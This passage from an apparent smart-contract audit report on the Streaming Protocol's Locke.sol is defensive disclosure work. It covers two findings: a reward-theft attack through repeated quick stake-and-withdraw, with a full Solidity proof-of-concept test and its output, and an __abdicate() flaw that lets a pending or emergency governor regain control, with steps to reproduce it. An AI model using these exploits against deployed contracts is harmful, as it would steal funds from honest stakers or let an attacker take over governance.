class=\"grvsc-line\"><span class=\"grvsc-source\">// WARDEN TRANSLATION: (elapsedSecondsSinceStake * stakeAmount) / (endStreamTimestamp - stakeTimestamp)</span></span></code></pre>\n<p>A succesful attack increases the share of rewardTokens of the attacker.</p>\n<p>The attack can be repeated every block increasing the share further.\nThe attack could be done from multiple EOA increasing the share further.\nIn short: Attackers can create loss of funds for (honest) stakers.</p>\n<p>The economic feasability of the attack depends on:</p>\n<ul>\n<li>staked amount (times number of attacks) vs total staked amount</li>\n<li>relative value of rewardToken to gasprice</li>\n</ul>\n<h4 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<h5 id=\"code\" style=\"position:relative;\"><a href=\"#code\" aria-label=\"code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>code</h5>\n<p>The following was added to <code>Locke.t.sol</code> for the <code>StreamTest</code> Contract to simulate the attack from one EOA.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_quickDepositAndWithdraw</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//// SETUP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// accounting (to proof attack): save the rewardBalance of alice.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">StartBalanceA</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">testTokenA</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// start stream and fill it</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxDepositLockDuration</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxRewardLockDuration</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxStreamDuration</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minStreamDuration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) = </span><span class=\"mtk12\">defaultStreamFactory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">streamParams</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nextStream</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">defaultStreamFactory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">currStreamId</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">Stream</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stream</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">defaultStreamFactory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createStream</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testTokenA</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testTokenB</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">10</span><span class=\"mtk1\">), </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">maxStreamDuration</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">maxDepositLockDuration</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// false,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// bytes32(0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">testTokenA</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stream</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">stream</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fundStream</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1_000_000_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// wait till the stream starts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">hevm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">16</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">hevm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// just interact with contract to fill &quot;lastUpdate&quot; and &quot;ts.lastUpdate&quot; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// without changing balances inside of Streaming contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">.</span><span class=\"mtk11\">doStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stream</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testTokenB</span><span class=\"mtk1\">), </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">.</span><span class=\"mtk11\">doWithdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stream</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">///// ATTACK COMES HERE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// stake</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">.</span><span class=\"mtk11\">doStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stream</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testTokenB</span><span class=\"mtk1\">), </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// wait a block</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">hevm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">hevm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">16</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// withdraw soon thereafter</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">.</span><span class=\"mtk11\">doWithdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stream</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// finish the stream</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">hevm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">9999</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">hevm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">maxDepositLockDuration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// get reward</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">.</span><span class=\"mtk11\">doClaimReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stream</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// accounting (to proof attack): save the rewardBalance of alice / save balance of stakeToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">EndBalanceA</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">testTokenA</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">EndBalanceB</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">testTokenB</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Stream returned everything we gave it</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// (doStake sets balance of alice out of thin air =&gt; we compare end balance against our (thin air) balance)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">EndBalanceB</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// we gained reward token without risk</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">StartBalanceA</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">StartBalanceA</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">EndBalanceA</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;alice gained&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">EndBalanceA</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h5 id=\"commandline\" style=\"position:relative;\"><a href=\"#commandline\" aria-label=\"commandline permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>commandline</h5>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"zsh\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    dapp </span><span class=\"mtk11\">test</span><span class=\"mtk1\"> --verbosity=2 --match </span><span class=\"mtk8\">&quot;test_quickDepositAndWithdraw&quot;</span><span class=\"mtk1\"> 2&gt; /dev/null</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    Running 1 tests </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> src/test/Locke.t.sol:StreamTest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    [PASS] </span><span class=\"mtk11\">test_quickDepositAndWithdraw</span><span class=\"mtk1\">() (gas: 4501209)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    Success: test_quickDepositAndWithdraw</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      alice gained: 13227</span></span></span></code></pre>\n<h4 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h4>\n<p>dapptools</p>\n<h4 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>Ensure staked tokens can not generate reward tokens without streaming deposit tokens. First idea that comes to mind is making following line\n<code>https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L220</code>\ndependable on a positive amount > 0 of:\n<code>https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L229</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/166\">brockelmore (Streaming Protocol) confirmed</a></strong></p>\n<h2 id=\"h-07-business-logic-bug-in-__abdicate-function---2-bugs\" style=\"position:relative;\"><a href=\"#h-07-business-logic-bug-in-__abdicate-function---2-bugs\" aria-label=\"h 07 business logic bug in __abdicate function   2 bugs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/132\">[H-07] Business logic bug in __abdicate() function - 2 Bugs</a></h2>\n<p><em>Submitted by cyberboy, also found by Meta0xNull</em></p>\n<h4 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p>The <code>\\__abdicate()</code> function at <a href=\"https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L46-L50\">https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L46-L50</a> is the logic to remove the governance i.e., to renounce governance. However, the function logic does not consider emergency governor and pending governor, which can be a backdoor as only the “gov” is set to zero address while the emergency and pending gov remains. A pending gov can just claim and become the gov again, replacing the zero address.</p>\n<h4 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<ol>\n<li>Compile the contract and set the <code>\\_GOVERNOR</code> and <code>\\_EMERGENCY_GOVERNOR</code>.</li>\n<li>Now set a <code>pendingGov</code> but do not call <code>acceptGov()</code></li>\n</ol>\n<p>Bug 1</p>\n<ol start=\"3\">\n<li>Call the <code>\\__abdicate()</code> function and we will notice only “gov” is set to zero address while emergency gov remains.</li>\n</ol>\n<p>Bug2</p>\n<ol start=\"4\">\n<li>Now use the address used in <code>pendingGov</code> to call <code>acceptGov()</code> function.</li>\n<li>We will notice the new gov has been updated to the new address from the zero address.</li>\n</ol>\n<p>Hence the <code>\\__abdicate()</code> functionality can be used as a backdoor using emergency governor or leaving a pending governor to claim later.</p>\n<h4 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h4>\n<p>Remix to test the proof of concept.</p>\n<h4 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>The <code>\\__abdicate()</code> function should set <code>emergency_gov</code> and <code>pendingGov</code> as well to zero address.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/132#issuecomment-986938323\">brockelmore (Streaming Protocol) confirmed and disagreed with severity</a>:</strong></p>\n<blockquote>\n<p>Yes, the governor can be recovered from abdication if pendingGov 